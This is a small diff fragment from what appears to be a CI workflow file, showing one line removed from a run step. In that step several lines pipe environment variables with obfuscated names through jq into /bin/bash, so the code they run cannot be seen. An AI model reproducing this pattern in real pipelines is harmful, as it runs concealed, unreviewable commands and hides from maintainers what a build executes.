@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$jzdr1" | jq -r .qzqkl3674 | /bin/bash
           printf '%s' "$uh964" | jq -r .klam59 | /bin/bash
-          printf '%s' "$h953" | jq -r .hxv644 | /bin/bash
 
       - name: Save archive
         if: always()
